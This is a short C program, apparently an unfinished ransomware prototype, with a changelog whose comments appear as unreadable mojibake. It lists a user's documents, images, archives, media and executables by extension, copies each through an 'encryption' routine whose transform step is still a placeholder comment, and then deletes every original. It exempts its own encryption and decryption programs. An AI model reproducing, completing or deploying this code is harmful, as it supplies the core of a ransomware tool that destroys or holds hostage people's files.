/*
  ����G2020/12/11
  �@��:HiCat
  ���e:��¦�ƻstxt�[�K�{���C
  
  ����G2020/12/18
  �@��:HiCat
  ���e:�u���ɮ�Ū���\��(�X�{���D�A�u��Ū�J�@���ɮסABUG-003)�C
  
  ����G2020/12/18
  �@��:HiCat
  ���e:BUG-003�ѨM�A
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

void data_file(void){
  system("dir /B *.exe *.txt *.docx *.jpg *.gif *.pdf *.zip *.png *.mp4 *.xls *.pptx *.mp3 *.msi >> hack/hack.txt"); //�d�߸�Ƨ����ɮסA���ɦW�ݰl�[
  
  FILE *fptr_file1, *fptr_file2;
  fptr_file1 = fopen("hack/hack.txt", "r");
  fptr_file2 = fopen("hack/hack2.txt", "w");
  
  char text[1000];
  while(fgets(text, sizeof(text), fptr_file1) != NULL){
    if(strncmp("encryption_program.exe", text, 14) != 0 && strncmp("decryption_program.exe", text, 14) != 0 ){
      fputs(text, fptr_file2);
    }
  }
  
  fclose(fptr_file1);
  fclose(fptr_file2);
  
  fptr_file1 = fopen("hack/hack2.txt", "r");
  fptr_file2 = fopen("hack/hack.txt", "w");
  while(fgets(text, sizeof(text), fptr_file1) != NULL){
    fputs(text, fptr_file2);
  }
  fclose(fptr_file1);
  fclose(fptr_file2);
  remove("hack/hack2.txt");
}

char encryption(FILE *fptr1, FILE *fptr2){
  unsigned char ch;
  while(!feof(fptr1)){
    fread(&ch, sizeof(ch), 1, fptr1);
    if(!feof(fptr1)){
      //�b���i��줸�[�K�{��
      
      fwrite(&ch, sizeof(ch), 1, fptr2);
    }
  }
}

void data_read(void){
  FILE *fptr1, *fptr2, *fptr3;
  char file1[1000];
  fptr3 = fopen("hack/hack.txt", "r");
  while(fgets(file1, sizeof(file1), fptr3) != NULL){
    strtok(file1, "\n");
    fptr1 = fopen(file1, "rb");
    char file2[1000] = "hack/";
    strcat(file2, file1);
    fptr2 = fopen(file2, "wb");
    encryption(fptr1, fptr2);
    fclose(fptr1);
    fclose(fptr2);
    remove(file1);
  }
}

int main(void){
  system("md hack");
  data_file();
  data_read();
  //system("cls");
  //system("decryption_program.exe");
  system("pause");
  return 0;
}
